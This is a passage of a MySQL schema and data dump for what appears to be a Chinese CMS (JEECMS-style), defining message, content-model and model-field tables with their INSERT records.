  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  PRIMARY KEY (`msg_id`),
  KEY `fk_jc_message_user_send` (`msg_send_user`),
  KEY `fk_jc_message_user_receiver` (`msg_receiver_user`),
  KEY `fk_jc_message_site` (`site_id`),
  CONSTRAINT `fk_jc_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='站内信';

-- ----------------------------
-- Records of jc_message
-- ----------------------------

-- ----------------------------
-- Table structure for jc_model
-- ----------------------------
DROP TABLE IF EXISTS `jc_model`;
CREATE TABLE `jc_model` (
  `model_id` int(11) NOT NULL,
  `model_name` varchar(100) NOT NULL COMMENT '名称',
  `model_path` varchar(100) NOT NULL COMMENT '路径',
  `tpl_channel_prefix` varchar(20) DEFAULT NULL COMMENT '栏目模板前缀',
  `tpl_content_prefix` varchar(20) DEFAULT NULL COMMENT '内容模板前缀',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图高度',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认模型',
  `is_global` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否全站模型',
  `site_id` int(11) DEFAULT NULL COMMENT '非全站模型所属站点',
  PRIMARY KEY (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS模型表';

-- ----------------------------
-- Records of jc_model
-- ----------------------------
INSERT INTO `jc_model` VALUES ('1', '新闻', '1', 'news', 'news', '139', '139', '310', '310', '1', '1', '0', '1', '1', null);
INSERT INTO `jc_model` VALUES ('2', '单页', '2', 'alone', 'alone', '139', '139', '310', '310', '2', '0', '0', '0', '1', null);
INSERT INTO `jc_model` VALUES ('4', '下载', '4', 'download', 'download', '139', '139', '310', '310', '4', '1', '0', '0', '1', null);
INSERT INTO `jc_model` VALUES ('5', '图库', '5', 'pic', 'pic', '139', '139', '310', '310', '5', '1', '0', '0', '1', null);
INSERT INTO `jc_model` VALUES ('6', '视频', '6', 'video', 'video', '139', '139', '310', '310', '10', '1', '0', '0', '1', null);
INSERT INTO `jc_model` VALUES ('8', '招聘', 'job', 'job', 'job', '139', '139', '310', '310', '10', '1', '0', '0', '1', null);
INSERT INTO `jc_model` VALUES ('9', '文库', 'wenku', 'doc', 'doc', '139', '139', '310', '310', '10', '1', '0', '0', '1', null);

-- ----------------------------
-- Table structure for jc_model_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_model_item`;
CREATE TABLE `jc_model_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型',
  `is_single` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否独占一行',
  `is_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否栏目模型项',
  `is_custom` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否自定义',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填项',
  `image_width` int(11) DEFAULT NULL COMMENT '图片宽度',
  `image_height` int(11) DEFAULT NULL COMMENT '图片宽度',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_model` (`model_id`),
  CONSTRAINT `fk_jc_item_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`)
) ENGINE=InnoDB AUTO_INCREMENT=459 DEFAULT CHARSET=utf8 COMMENT='CMS模型项表';

-- ----------------------------
-- Records of jc_model_item
-- ----------------------------
INSERT INTO `jc_model_item` VALUES ('1', '1', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('2', '1', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('3', '1', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('4', '1', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('5', '1', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('6', '1', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('7', '1', 'tplContent', '选择模型模板', '10', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('8', '1', 'channelStatic', '栏目静态化', '11', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('9', '1', 'contentStatic', '内容静态化', '11', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('10', '1', 'priority', '排列顺序', '11', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('11', '1', 'display', '显示', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('12', '1', 'docImg', '文档图片', '11', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('14', '1', 'afterCheck', '审核后', '12', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('15', '1', 'commentControl', '评论', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('16', '1', 'allowUpdown', '顶踩', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('17', '1', 'viewGroupIds', '浏览权限', '11', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('18', '1', 'contriGroupIds', '投稿权限', '11', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('20', '1', 'link', '外部链接', '11', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('21', '1', 'titleImg', '标题图', '11', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('23', '1', 'title', '标题', '9', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('24', '1', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('25', '1', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('26', '1', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('27', '1', 'description', '摘要', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('28', '1', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('29', '1', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('30', '1', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('31', '1', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('32', '1', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('33', '1', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('34', '1', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('35', '1', 'typeImg', '类型图', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('36', '1', 'titleImg', '标题图', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('37', '1', 'contentImg', '内容图', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('38', '1', 'attachments', '附件', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('39', '1', 'media', '多媒体', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('40', '1', 'txt', '内容', '11', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('42', '2', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('43', '2', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('44', '2', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('45', '2', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('46', '2', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('47', '2', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('48', '2', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('49', '2', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('51', '2', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('52', '2', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('53', '2', 'txt', '内容', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('93', '4', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('94', '4', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('95', '4', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('96', '4', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('97', '4', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('98', '4', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('99', '4', 'tplContent', '选择模型模板', '9', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('100', '4', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('101', '4', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('102', '4', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('103', '4', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('104', '4', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('105', '4', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('107', '4', 'channelId', '栏目', '1', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('108', '4', 'title', '软件名称', '2', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('109', '4', 'shortTitle', '软件简称', '3', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('110', '4', 'titleColor', '标题颜色', '4', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('111', '4', 'description', '摘要', '5', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('112', '4', 'author', '发布人', '6', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('113', '4', 'viewGroupIds', '浏览权限', '7', null, null, null, null, null, null, null, '7', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('114', '4', 'topLevel', '固顶级别', '8', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('115', '4', 'releaseDate', '发布时间', '9', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('116', '4', 'typeId', '内容类型', '9', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('117', '4', 'tplContent', '指定模板', '22', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('118', '4', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('119', '4', 'attachments', '资源上传', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('120', '4', 'txt', '软件介绍', '20', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('121', '4', 'softType', '软件类型', '12', '国产软件', '国产软件,国外软件', '100', '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('122', '4', 'warrant', '软件授权', '13', '免费版', '免费版,共享版', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('123', '4', 'relatedLink', '相关链接', '14', 'http://', '', '50', '3', '30', '', '', '1', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('124', '4', 'demoUrl', '演示地址', '15', 'http://', null, '60', '3', '30', null, null, '1', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('125', '5', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('126', '5', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('127', '5', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('128', '5', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('129', '5', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('130', '5', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('131', '5', 'tplContent', '选择模型模板', '10', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('132', '5', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('133', '5', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('134', '5', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('135', '5', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('136', '5', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('138', '5', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('139', '5', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('140', '5', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('141', '5', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('142', '5', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('144', '5', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('145', '5', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('146', '5', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('147', '5', 'channelId', '栏目', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('148', '5', 'title', '标题', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('149', '5', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('150', '5', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('151', '5', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('152', '5', 'description', '摘要', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('153', '5', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('154', '5', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('155', '5', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('156', '5', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('157', '5', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('158', '5', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('159', '5', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('160', '5', 'typeImg', '类型图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('161', '5', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('162', '5', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('163', '5', 'pictures', '图片集', '11', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('164', '6', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('165', '6', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('166', '6', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('167', '6', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('168', '6', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('169', '6', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('170', '6', 'tplContent', '选择模型模板', '10', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('171', '6', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('172', '6', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('173', '6', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('174', '6', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('175', '6', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('177', '6', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('178', '6', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('179', '6', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('180', '6', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('181', '6', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('183', '6', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('184', '6', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('185', '6', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('186', '6', 'channelId', '栏目', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('187', '6', 'title', '标题', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('188', '6', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('189', '6', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('190', '6', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('191', '6', 'description', '内容简介', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('192', '6', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('193', '6', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('194', '6', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('195', '6', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('196', '6', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('197', '6', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('198', '6', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('199', '6', 'typeImg', '类型图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('200', '6', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('201', '6', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('202', '6', 'attachments', '附件', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('203', '6', 'media', '多媒体', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('246', '4', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('249', '8', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('250', '8', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
